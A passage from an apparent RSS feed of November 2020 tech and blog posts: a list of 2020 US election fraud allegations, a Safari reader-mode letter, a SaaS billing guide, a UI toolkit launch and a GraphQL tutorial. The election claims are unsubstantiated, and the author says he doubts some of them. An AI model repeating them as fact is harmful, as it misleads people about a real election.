<p>1. There was a “software bug” in one jurisdiction, the exact same software was used in half of Michigan and multiple states. Only the one county noted the fix. They want to re-evaluate and manually recount in said counties. Code reviews requested.</p>
<p>2. Pennsylvania USPS (more than one) said the postal service was backdating ballots AND collecting ballots after the date (prior to back dating, i.e. they knew)</p>
<p>3. Michigan had a lot of dead people vote &gt;50 for one county, thus far that they’ve found.</p>
<p>4. All the states have laws enabling the voting process to be accessible to the public, due to COVID-19 they limited public observers, particularly from independents. Legal challenges can occur, as that is against many states laws.</p>
<p>5. Democrat poll watchers were handing out pamphlets on “how to distract GOP poll watchers”</p>
<p>6. Poll watchers claim to have seen ballots with the same or no signatures be counted in Michigan</p>
<h3>Personal Opinion</h3>
<p>Personally, I believe this is the correct course of action. I’m not sure I believe all the claims.</p>
<p>However, I think it’s very important we challenge the votes, see where it falls and improve the Republic. Even if we do it after the election, it’s important we identify fraud and / or improve the process so this doesn’t happen again.</p>
<p>Unfortunately, the news media is not presenting this very well. I am concerned this will lead to a civil war. The Democratic party knows they are not officially the president elect, yet hold press conferences, that look like this…</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png" alt="" width="792" height="530" srcset="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png 1024w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-300x201.png 300w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-768x514.png 768w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png 1514w" sizes="(max-width: 792px) 100vw, 792px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png 1024w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-300x201.png 300w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-768x514.png 768w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png 1514w"></a>I’m not convinced this wont lead to violence. I’m concerned because it looks like <em>if the Democrats lose the election.</em> There will be a rival government setup. Several <a href="https://www.cnn.com/2020/11/07/americas/biden-global-reaction-election-intl/index.html" target="_blank" rel="noopener noreferrer">foreign powers have already acknowledged Biden as the victor</a>, for instance.</p>
<p>Personally, I just want a safe environment for my friends and family. I think most of us do.</p>

</div>

</article></div>]]>
            </description>
            <link>https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069181</guid>
            <pubDate>Thu, 12 Nov 2020 12:41:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Open Letter to Safari]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069172">thread link</a>) | @z3t4
<br/>
November 12, 2020 | https://xn--zta-qla.com/en/blog/safari_vs_semantics.htm | <a href="https://web.archive.org/web/*/https://xn--zta-qla.com/en/blog/safari_vs_semantics.htm">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p>Hello Safari team!</p>

<p>My name is Johan, and I work as a web developer.</p>

<p>I like semantic HTML elements and when creating web sites I try to avoid div's.</p>

<p>The reason why I prefer semantic elements is that they make editing easier.<br>
I have a vision that ordinary people should be able to write documents for the web!</p>

<!--
<p>Even though the web have existed for over 30 years, it's still the best way to share documents,
not only can you share documents, you can make *interactive* documents, and link to <i>other</i> documents.
Heck you can even share a "document" that is a full fledged application (web app).
The web is still lightyears ahead of Execl and Word, yet there are more people writing in Excel and Word then there are people writing web pages/documents ...</p>
-->

<h2>Web development</h2>

<p>It's my job as a web developer to make these "documents" easily accessible.<br>
And with accessible I mean it should not only be accessible by people with different forms of blindness,
it should be accessible for editing too. 
And one thing that helps with accessibility is semantic elements:
Instead of using div elements and CSS class names as markup, I try to use semantic elements and as little CSS classes as possible.
This makes the web pages more accessible for everyone.<br>
There is only one problem though:</p>

<h2>Safari Reader mode</h2>

<p>I work with a good designer that can make very beautiful "documents" (web pages).
But if I use semantic elements like &lt;section&gt; Safari will automatically put the page in "reader mode", 
which means all design goes "poof" and the layout is mangled.<br>
And the only way to avoid "reader mode" in Safari is to <i>not use semantic elements</i>.<br>
So please Safari - let me use semantic HTML elements - and let users enjoy the beautiful design.</p>

<!-- *kommentera-mera* -->

<hr>

<p>Written by  November 11th, 2020.</p>


</div></div>]]>
            </description>
            <link>https://xn--zta-qla.com/en/blog/safari_vs_semantics.htm</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069172</guid>
            <pubDate>Thu, 12 Nov 2020 12:40:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Best way to do billing for a SaaS MVP]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069132">thread link</a>) | @nrthrn
<br/>
November 12, 2020 | https://voucherly.app/best-mvp-billing-system-for-saas/ | <a href="https://web.archive.org/web/*/https://voucherly.app/best-mvp-billing-system-for-saas/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-elementor-type="wp-page" data-elementor-id="126" data-elementor-settings="[]">
						<div>
							<div>
							<section data-id="4143da05" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;gradient&quot;,&quot;shape_divider_bottom&quot;:&quot;clouds&quot;,&quot;shape_divider_bottom_negative&quot;:&quot;yes&quot;}">
							
						
					<div>
							<div>
					<div data-id="2e20b508" data-element_type="column">
			<div>
							<div>
						<div data-id="bfc7933" data-element_type="widget" data-widget_type="image.default">
				<div>
					<p><img width="300" height="150" src="https://voucherly.app/wp-content/uploads/2020/10/Voucherly-Logo-1.png" alt="" loading="lazy">											</p>
				</div>
				</div>
				<div data-id="6f6d3033" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>How to setup the best billing system for a SaaS product MVP.​</h2>		</p>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="49dee567" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
						<div>
							<div>
					<div data-id="1b805f10" data-element_type="column">
			<div>
							<div>
						<div data-id="66fd27ce" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>When starting with the early version or MVP of your SaaS product, setting up the right user management and billing system that offers the most flexibility for the cheapest dollar is key. This is a guide on recommendations built on trial and error and experience on the best billing flow and requirements for the MVP of a SaaS product.&nbsp;<span>These recommendations do expect you either have a “plan based” or “freemium” model for your SaaS product.</span></p></div>
				</div>
				</div>
				<div data-id="5f92ac4c" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Here is what you need from your MVP’s billing system:</p><ol><li><p>Handling automatic billing for a monthly subscription (or one time, depending on your app model).</p></li><li><p>The ability to easily change and adapt your packages, so you can test pricing and packaging.</p></li><li><p>Finally, the ability to participate in other acquisition methods: giveaways, bundles, annual contracts or app marketplaces.</p></li></ol></div>
				</div>
				</div>
				<div data-id="0013a71" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Before we dive into the different methods. Please know that this is built from my experience and my investment dollars. I have built multiple SaaS ventures over the years, and have made many mistakes around that billing process. I have made it too complex and never got the value out of the added complexity (one of my ventures was for parents of school children, later pivoted to school boards); and I have also made the mistake of too simple, and then stuck without any flexibility (such as need 2 and 3 above).</span></p></div>
				</div>
				</div>
				
				<div data-id="4dfbb32" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>1. Stripe Only (or similar payment processor)</h2>		</p>
				</div>
				<div data-id="903f28f" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Using only Stripe as your payment middleman means that every new account creation will need to go through the subscription step on your platform. It is the simplest, but suddenly you will find yourself without the flexibility to “give away” an account to a reviewer or beta tester, and also lack the ability to handle acquisition channels like the marketplaces and giveaways mentioned. Lastly, in beta testing, you will be limited to paid beta tests, which is not ideal for many applications and services.</span></p></div>
				</div>
				</div>
				<div data-id="80d9ee6" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>2. Stripe and discount codes</h2>		</p>
				</div>
				<div data-id="46a9fb5" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>One of the e-commerce inspired workarounds is to continue to use Stripe but add discount codes. One of the main challenges in discount codes (vs vouchers), is that 1-to-many vs 1-to-1 relationship. You can drop a discount code into a Reddit post and suddenly are need to now manage multiple discount codes and tracking where/how/who they are being used. I am sure you have googled the web for discount codes or relied on Honey to find cheap things before! Ideally you do not open yourself to this challenge just yet.</span></p><p>Another problem with discount codes is that the 3rd need above (those alternate acquisition channels) need to have that 1-to-1 experience, and therefore will not accept discount codes. You have gained a way to test pricing and packaging, but also opened up some challenges.</p></div>
				</div>
				</div>
				<div data-id="f8d4400" data-element_type="widget" data-widget_type="heading.default">
				<p>
			<h2>3. Stripe, manual account creation, and vouchers.</h2>		</p>
				</div>
				<div data-id="01fe8d8" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p><span>Manual account creation is probably throwing you through a loop, why have that and Stripe? The answer is quite simple here. Stripe is providing your automation, creating and handling the billing for customers that are entering through the main channel of your application. However if you have the ability to create a customer on the backend, which bypasses Stripe, you open yourself up to a lot of flexibility.</span></p><p>Here are some examples of accounts I would manually create:</p><ul><li><p>Testing accounts for trying out the flow or bug hunting.</p></li><li><p>An “ideal account” one that is fully setup as an ideal customer would. This is your “stage” for screenshots, video clips, and demonstrating the platform.</p></li><li><p>Creating an account for someone to access and use the platform for free: often people giving feedback, app reviewers, friends, investors, etc.</p></li><li><p>Annual contracts: If someone would rather pay annually or quarterly, I would create their account and then handle billing in Quickbooks or Freshbooks.</p></li><li><p>Participate in marketplaces, bundles, giveaways and other systems.</p></li><li><p>Betas and early adopter participation.</p></li></ul><p>For some of those manually created accounts, having a voucher system is key. I mentioned before the important of using vouchers versus discount codes, but let’s focus on the MVP way to do this. If you have manual account creation, you can pre-create a number of accounts that bypass Stripe, which you will use for different needs. Assigning a voucher code to each username/password and uploading to Voucherly allows you to then sell on marketplaces, launch a giveaway, participate in a software bundle, resellers, or even betas. How it works is that Voucherly takes over the role of getting the new users information, sending the new account credentials and ensure the voucher codes are valid. It is a thousand times cheaper that building it into your MVP, and a requirement for many of those acquisition channels.</p></div>
				</div>
				</div>
				<div data-id="04e656a" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>To wrap it all up,<strong> your ideal MVP platform flow should be the third option.</strong></p><p>It gives the highest level of flexibility with minimal effort. With the voucher system being outside of the application and no-code, it cuts down on the development time and complexity, and the manual account creation gives you flexibility to try different acquisition channels.</p><p>To help you get started we have put together a template of billing system requirements that you can use for your own SaaS product. To get access, join the Voucherly waitlist.</p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
				<section data-id="92f9168" data-element_type="section" data-settings="{&quot;background_background&quot;:&quot;classic&quot;,&quot;shape_divider_top&quot;:&quot;wave-brush&quot;}">
					
					<div>
							<div>
					<div data-id="6ba8b6d5" data-element_type="column">
			<div>
							<div>
						
				
				<div data-id="180a1eb5" data-element_type="widget" data-widget_type="text-editor.default">
				<div>
					<div><p>Any doubt? Or want to jump to the top on the waitlist?</p><p><span><a href="mailto:tyler@nrthrn.io">Contact us</a></span></p></div>
				</div>
				</div>
						</div>
					</div>
		</div>
								</div>
					</div>
		</section>
						</div>
						</div>
					</div></div>]]>
            </description>
            <link>https://voucherly.app/best-mvp-billing-system-for-saas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069132</guid>
            <pubDate>Thu, 12 Nov 2020 12:34:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[SixtyFPS]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069043">thread link</a>) | @ogoffart
<br/>
November 12, 2020 | https://sixtyfps.io/blog/introducing-sixtyfps.html | <a href="https://web.archive.org/web/*/https://sixtyfps.io/blog/introducing-sixtyfps.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        
    <section>
        <div>

    
    <h5>Posted on November 10, 2020</h5>
    

  <p>We’re Olivier &amp; Simon - two enthusiastic software engineers who enjoy developing software for product
    teams. Today we’d like to introduce you to our new venture.</p>
  <h3 id="what-is-sixtyfps">What is SixtyFPS?</h3>

  <p><strong>A fresh, new graphical toolkit for desktop apps and embedded devices</strong></p>
  <p>
    We're building a product to make UI development faster and easier, no matter what programming language, platform, or
    form-factor. Our toolkit consists of the following key components:
  </p><ul>
    <li>A design-friendly <span>markup language</span> for UI elements</li>
    <li>A run-time library with <span>APIs in C++, Rust and JavaScript</span></li>
    <li>An optimizing <span>compiler</span> to compile designs to native C++/Rust
    </li>
  </ul>

  

  <h3 id="express-user-interface-constraints-and-relations">Express user interface constraints and
    relations</h3>
  <p>Designing a user interface starts with primitive graphical elements, such as shapes or images. The design you
    envision requires placing these elements on a display surface, based on a coordinate system, to produce a visual
    hierarchy. We use our <code>.60</code> markup language to define these elements, where and how they are placed,
    and
    how they exchange data. Let’s have a look at an example:</p>
  
  <div>
    <div>
      <div>
        <p>Code</p>
        <hr>
        <p><img src="https://sixtyfps.io/blog/introducing-sixtyfps/hello_world.png" alt="Hello World Example">
      </p></div>
      <div>
        <p>Screenshot</p>
        <hr>
        <p><img src="https://sixtyfps.io/blog/introducing-sixtyfps/hello_world_screenshot.png" alt="Hello World Screenshot">
      </p></div>
    </div>

  </div>
  <p>This snippet of code describes a rectangle and a text element that render a button. It looks like a blend of
    <code>JSON</code> and <code>CSS</code>, which is intentional. We took the structural aspect of <code>JSON</code>,
    added the nice aspects of <code>CSS</code>, such as numbers with absolute or relative lengths, named colors, and
    layouts. We also added an automatic property binding system.</p>
  <p>There’s a lot more to unpack here. Our constantly-evolving <a href="https://github.com/sixtyfpsui/sixtyfps/blob/master/docs/langref.md">markup language reference
      documentation</a> is a good starting point for a deeper dive. You can also play with the example above in our
    <a href="https://sixtyfps.io/editor/?load_url=https://sixtyfps.io/blog/introducing-sixtyfps/hello_world.60">experimental
      online editor</a>.</p>
  <h3 id="performance">Performance</h3>
  <figure>
    <a href="https://www.sixtyfps.io/demos/printerdemo">
      <img src="https://sixtyfps.io/resources/printerdemo_screenshot.png" alt="Screenshot of Printer Demo">
      <figcaption>Screenshot of the printer demo</figcaption>
    </a>
  </figure>
  <p>As chipsets become faster and RAM becomes cheaper, the scale at which computing devices are produced for our
    appliances grows. In our experience, software that uses less CPU and memory will always have an edge. An optimized
    software stack means that save money on the per-unit hardware cost.</p>
  <p>We are committed to providing that edge through:</p>
  <ul>
    <li>Our <code>.60</code> markup compiler generates a carefully designed memory layout. All the components and
      properties are in one flat memory allocation that is compact and requires minimal <code>malloc</code> calls.
    </li>
    <li>Our lightweight property system evaluates binding expressions lazily.</li>
    <li>Our rendered uses GPU acceleration by default.</li>
  </ul>
  <p>Check out our <a href="https://sixtyfps.io/#demos">demos online</a> to get a feeling for how smooth UIs can
    be,
    even when compiled to run in a web browser simulation.</p>
  <h3 id="integrate-into-different-languages">Integrate into different languages</h3>
  <p>One particular aspect of software development that we enjoy is the diverse landscape. Different teams use
    different
    programming languages, with their unique constraints and talent pools. We embrace this diversity and believe that
    a
    good UI toolkit should support this by making every language feel as if it’s the native toolkit. It’s crucial to
    provide idiomatic APIs, so that teams can feel right at home. We do this by making sure that:</p>
  <ol type="1">
    <li>Our C++ integration uses modern C++ 17 and comes with built-in CMake support.</li>
    <li>For Rust developers, we offer a convenient crate, <code>build.rs</code> integration, and even a proc-macro.
    </li>
    <li>Our NodeJS integration is available via <code>npm</code> and allows you to write signal handlers in JavaScript
      and
      even provide custom data models.</li>
  </ol>
  <p>Check out our <a href="https://sixtyfps.io/#tryout">API documentation for the different languages</a>.</p>
  <p>We choose to first support this set of langages because it is the implementation language, another low level
    language, and a dynamic language.
    We believe that it will be easy to extend the integration into more programming languages later.</p>

  <h2 id="whats-next">What’s next?</h2>
  <p>Our project is still in an alpha state. We would love to get your feedback; give it a try. You can provide feedback
    or join our discussions on <a href="https://github.com/sixtyfpsui/sixtyfps">our
      GitHub</a> site.</p>
  <p>In the next few months we're looking forward to completing an off-the-shelf version 1.0. SixtyFPS
    in its current shape is a highly customizable, compelling starting point for new UI product developments and
    prototypes.</p>
  <p>We're be happy to engage in contracting work to explore custom UI development projects with
    SixtyFPS.
  </p>
  <p>Get in touch with us via <a href="mailto:info@sixtyfps.io">email</a>.</p>


    </div>
</section>

    


    </div></div>]]>
            </description>
            <link>https://sixtyfps.io/blog/introducing-sixtyfps.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069043</guid>
            <pubDate>Thu, 12 Nov 2020 12:23:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Seven Reasons for Having a Personal Website]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069035">thread link</a>) | @sT370ma2
<br/>
November 12, 2020 | https://cheapskatesguide.org/articles/why-have-a-personal-website.html | <a href="https://web.archive.org/web/*/https://cheapskatesguide.org/articles/why-have-a-personal-website.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://cheapskatesguide.org/articles/why-have-a-personal-website.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069035</guid>
            <pubDate>Thu, 12 Nov 2020 12:21:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Power of Serverless GraphQL with AWS AppSync]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25069006">thread link</a>) | @slobodan_
<br/>
November 12, 2020 | https://serverless.pub/the-power-of-serverless-graphql-with-appsync/ | <a href="https://web.archive.org/web/*/https://serverless.pub/the-power-of-serverless-graphql-with-appsync/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div>
        <div>
            

            <p>
                <a href="https://serverless.pub/author/slobodan">Slobodan Stojanović</a> in <a href="https://serverless.pub/category/Serverless">Serverless</a> <i></i> <i></i> 

  20 minutes

            </p>

            <p>Every story needs a hero. But, not all heroes are the same. Some of them have superpowers, and some are ordinary people. This story’s hero is just a regular software developer who works in a small team on a medium-size application. Our hero loves his job most of the time, except when he sends a test push notification to thousands of their customers in production, like a few minutes ago.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/01-push-notifications.png" alt=""></p>

<p>One day, his boss came with a new project. “We need to build a new complex application for our new important customer.” Nice, our hero loves challenges! “But we need to do it fast, as we have a short deadline because they have an important marketing event!” Ok, how fast do we need to build an app? “It needs to be ready for yesterday. And it needs to be real-time and scalable!”</p>

<p>The new project is a big challenge for our hero, as he never did that kind of project. Can he even do it?</p>

<p>“You can do it,” his boss says. “I also hired a famous consultant to help you.” That’s awesome! Challenge accepted.</p>

<p>After a full-day meeting with the consultant, and a whiteboard full of weird diagrams, the plan was simple: “Just use Kubernetes!”</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/02-consultant.png" alt=""></p>

<p>But our hero doesn’t know Kubernetes. And there’s no time to learn it now. What should he do?</p>

<p>He started wondering if he is the only one who doesn’t know Kubernetes. Is he good enough for this job?</p>

<p>Our hero spent a sleepless night in front of his computer with his faithful sidekick, a rubber duck. He tried to learn as much as he can about this new technology. But he ended up more confused and tired.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/03-sidekick.png" alt=""></p>

<h2 id="you-should-try-serverless-graphql">You should try Serverless GraphQL</h2>

<p>In the middle of the night, our hero’s faithful sidekick said, “you should try serverless GraphQL.”</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/04-try-serverless-graphql.png" alt=""></p>

<p>Was he dreaming? And what the heck is serverless GraphQL? He knows what serverless is, but what’s GraphQL?</p>

<h3 id="whats-graphql">What’s GraphQL</h3>

<p>Do you remember when Mark Zuckerberg <a href="https://techcrunch.com/2012/09/11/mark-zuckerberg-our-biggest-mistake-with-mobile-was-betting-too-much-on-html5/">said</a>, “our biggest mistake was betting too much on HTML5?” It was a long time ago, back in 2012, when HTML5 was in its early days.</p>

<p>At that moment, the Facebook mobile app was an HTML5 web app embedded in the native mobile shell. They served all the news feed updates as HTML data from the server. However, HTML5 was in its early days, and the mobile web views were not performant enough, so the app wasn’t stable and scalable enough.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/05-fb-mobile-app.png" alt=""></p>

<p>In 2012, Facebook’s engineering team started rebuilding their mobile and switching to the native iOS and Android apps. They evaluated different options for delivering the news feed data, including RESTful services  and Facebook Query Language (FQL).</p>

<p>In the <a href="https://engineering.fb.com/2015/09/14/core-data/graphql-a-data-query-language/">“GraphQL: A data query language”</a> article in 2015, Lee Byron wrote:</p>

<blockquote>
  <p>We were frustrated with the differences between the data we wanted to use in our apps and the server queries they required. We don’t think of data in terms of resource URLs, secondary keys, or join tables; we think about it in terms of a graph of objects and the models we ultimately use in our apps like NSObjects or JSON.</p>
</blockquote>

<p>This frustration led the Facebook engineering team to rethink the way they serve data to their mobile application. Instead of returning a full model with a lot of unnecessary data, they tried to develop a new system to return only the data the application needed.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/06-data.png" alt=""></p>

<p>In 2015, they <a href="https://engineering.fb.com/2015/09/14/core-data/graphql-a-data-query-language/">announced</a> GraphQL, an open-source data query language. The idea behind GraphQL was simple, the client defines the data structure, and the server provides a JSON response with precisely the same format.</p>

<p>For example, the client wants to get the user with a specified ID. However, the application needs only the user’s name, a profile photo with a specific size, and the first five friend connections. Instead of sending two or three different requests to the RESTful API, with GraphQL, you can send a request similar to the one in the image below. And the response will be the JSON with the same structure, as you can see on the right side of the same image.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/07-an-example.jpg" alt=""></p>

<p>That sounds nice and smart. But why should our hero care about GraphQL? He doesn’t have the same problem Facebook had.</p>

<p>The problem Facebook’s engineering team had was the leading cause for inventing GraphQL. However, that’s not the only problem GraphQL solves. If you have one of the following symptoms, GraphQL might be the cure for the problems your application faces, too:</p>

<ul>
  <li>Distinct front end clients for multiple platforms, such as web and mobile, have different data requirements.</li>
  <li>Your back end serves data to your client apps from different sources. For example, your app has SQL and NoSQL databases, and it connects to some external systems.</li>
  <li>Your app has a complex state and caching managements for both front end and back end.</li>
  <li>Slow pages, especially on mobile, caused by multiple dependant HTTP requests.</li>
</ul>

<p>This list is not complete, and GraphQL can bring even more benefits to your application. Some of the main characteristics of GraphQL are:</p>

<ul>
  <li>It defines a data shape. The request always specifies the response’s form, which makes requests more predictable and easier to use.</li>
  <li>It’s hierarchical. Its strict relation between objects with graph-structured data simplifies getting data from multiple sources.</li>
  <li>It’s strongly typed. It can give you descriptive error messages before you run a query.</li>
  <li>It’s a protocol, not storage. Each GraphQL field is backed by a function on the back end, which allows you to connect it to any storage you want in the background.</li>
  <li>It’s introspective. You can query the GraphQL server for the types it supports. This gives you built-in documentation and also a base for a powerful toolset.</li>
  <li>It’s version free. The shape of the data is always defined by the client’s request, which means adding additional fields to your model will not affect your client application until you change the query itself.</li>
</ul>

<p>To combine data from multiple sources using RESTful API, you often send multiple HTTP requests and then connect data on the client-side. This works fine in perfect conditions. However, users don’t always use your app in ideal conditions. They are often on mobile with a limited or unstable network. Or they live in Australia, and each request is a few hundred milliseconds slower.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/08-multiple-data-sources.gif" alt=""></p>

<p>With GraphQL, you can archive the same with a single request. This will push a bit more load to the server-side, but that works just fine in most cases. It’s even better when you don’t own the server.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/09-graphql-request.gif" alt=""></p>

<h3 id="where-to-start-with-graphql">Where to start with GraphQL</h3>

<p>With GraphQL, you start by shaping your data using types. For example, if you are building a blog, you will have an author and a post, similar to the following code snippet. Each post will have its id, a name, a title, and an author. Authors have their ids, names, and a list of their posts.</p>

<p>As you can see, types also define a relation between an author and posts.</p>

<div><div><pre><code><span>type</span><span> </span><span>Author</span><span> </span><span>{</span><span>
  </span><span>id</span><span>:</span><span> </span><span>Int</span><span>
  </span><span>name</span><span>:</span><span> </span><span>String</span><span>
  </span><span>posts</span><span>:</span><span> </span><span>[</span><span>Post</span><span>]</span><span>
</span><span>}</span><span>

</span><span>type</span><span> </span><span>Post</span><span> </span><span>{</span><span>
  </span><span>id</span><span>:</span><span> </span><span>Int</span><span>
  </span><span>title</span><span>:</span><span> </span><span>String</span><span>
  </span><span>text</span><span>:</span><span> </span><span>String</span><span>
  </span><span>author</span><span>:</span><span> </span><span>Author</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>Once you have types, you can build your GraphQL schema. In the code snippet below, we define two queries: get author by ID and get posts by title. Each of these queries defines input parameters with their types and a return type.</p>

<div><div><pre><code><span>type</span><span> </span><span>Query</span><span> </span><span>{</span><span>
  </span><span>getAuthor</span><span>(</span><span>id</span><span>:</span><span> </span><span>Int</span><span>):</span><span> </span><span>Author</span><span>
  </span><span>getPostsByTitle</span><span>(</span><span>titleContains</span><span>:</span><span> </span><span>String</span><span>):</span><span> </span><span>[</span><span>Post</span><span>]</span><span>
</span><span>}</span><span>

</span><span>schema</span><span> </span><span>{</span><span>
  </span><span>query</span><span>:</span><span> </span><span>Query</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>As GraphQL is not storage but a protocol, we need to tell GraphQL where and how it can read the data by creating resolvers. In the following code snippet, we define two resolvers: one for the author that connects to the SQL database and one for a list of posts sends an HTTP request to the blog platform API.</p>

<div><div><pre><code>getAuthor(_, args){
  return sql.raw('SELECT * FROM authors WHERE id = %s', args.id);
}

posts(author){
  return request(`https://api.blog.io/by_author/${author.id}`);
}
</code></pre></div></div>

<p>Finally, we can run the query. As we defined queries, we can ask for an author by their ID. Relations allow us to get a list of all author’s posts in the same request. And if we ask for the author’s name for each blog post, that name will be the same as the author’s name above because it points to the same author.</p>

<div><div><pre><code><span>{</span><span>
  </span><span>getAuthor</span><span>(</span><span>id</span><span>:</span><span> </span><span>5</span><span>){</span><span>
    </span><span>name</span><span>
    </span><span>posts</span><span> </span><span>{</span><span>
      </span><span>title</span><span>
      </span><span>author</span><span> </span><span>{</span><span>
        </span><span># this will be the same as the name above</span><span>
        </span><span>name</span><span>
      </span><span>}</span><span>
    </span><span>}</span><span>
  </span><span>}</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>Once we run the query, GraphQL will parse the request, then validate the types and data shape, and finally, if the first two steps are correct, it will run the query and our resolvers. Once we receive the data, it’ll look similar to the following JSON data:</p>

<div><div><pre><code><span>{</span><span>
  </span><span>"name"</span><span>:</span><span> </span><span>"Slobodan"</span><span>,</span><span>
  </span><span>"posts"</span><span>:</span><span> </span><span>[{</span><span>
    </span><span>"title"</span><span>:</span><span> </span><span>"The power of serverless GraphQL with AppSync"</span><span>,</span><span>
    </span><span>"author"</span><span>:</span><span> </span><span>{</span><span>
      </span><span>"name"</span><span>:</span><span> </span><span>"Slobodan"</span><span>
    </span><span>}</span><span>
  </span><span>},</span><span> </span><span>{</span><span>
    </span><span>"title"</span><span>:</span><span> </span><span>"Handling webhooks with EventBridge, SAM and SAR"</span><span>,</span><span>
    </span><span>"author"</span><span>:</span><span> </span><span>{</span><span>
      </span><span>"name"</span><span>:</span><span> </span><span>"Slobodan"</span><span>
    </span><span>}</span><span>
  </span><span>}]</span><span>
</span><span>}</span><span>
</span></code></pre></div></div>

<p>By GraphQL specification, queries read the data. GraphQL specification also defines mutations and subscriptions. Mutations modify the existing data (i.e., add a new author or edit post), and subscriptions can notify you whenever the data is changed (i.e., it’ll run whenever the post is published).</p>

<h3 id="why-do-we-need-serverless-graphql">Why do we need serverless GraphQL?</h3>

<p>“You can always deploy your GraphQL using Kubernetes and write your resolvers by hand,” the rubber duck said, “but there’s an easier way.”</p>

<p>GraphQL makes retrieving your data from the client-side effortless, but you still need to manage and scale your infrastructure. And now, you have one central place that controls all of your requests. Unless you do the same you do with the other web applications – make your application serverless. Serverless GraphQL brings the best of both worlds: GraphQL makes you client-to-server connection effortless, and serverless simplifies maintenance of your infrastructure.</p>

<p><img src="https://serverless.pub/img/the-power-of-serverless-graphql/10-scaling.png" alt=""></p>

<p>“Interesting, but how do I make GraphQL application serverless?”</p>

<p>“There are many ways to do that,” the rubber duck said. “You can do that manually using the familiar serverless services. For example, on AWS, you can use Amazon API …</p></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://serverless.pub/the-power-of-serverless-graphql-with-appsync/">https://serverless.pub/the-power-of-serverless-graphql-with-appsync/</a></em></p>]]>
            </description>
            <link>https://serverless.pub/the-power-of-serverless-graphql-with-appsync/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25069006</guid>
            <pubDate>Thu, 12 Nov 2020 12:18:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Zero to the Power of Zero]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25068785">thread link</a>) | @nathell
<br/>
November 12, 2020 | https://sortingsearching.com/2020/11/11/zero-power-zero.html | <a href="https://web.archive.org/web/*/https://sortingsearching.com/2020/11/11/zero-power-zero.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <h2 id="the-controversy">The controversy</h2>

